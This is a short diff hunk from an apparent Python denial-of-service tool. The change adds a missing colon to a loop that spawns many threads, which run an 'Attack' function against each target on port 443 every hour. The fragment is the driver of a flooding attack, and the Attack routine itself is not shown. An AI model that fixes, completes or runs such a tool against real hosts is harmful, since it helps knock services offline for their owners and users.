@@ -36,7 +36,7 @@ while 1 == 1:
             count_targets = len(rrow)
             count_threads = int(1000//count_targets)
             for r in rrow:
-                for i in count_threads
+                for i in count_threads:
                     threading.Thread(target=Attack, args=(r, 443, 1024, timeout,)).start()
     time.sleep(3600)
  
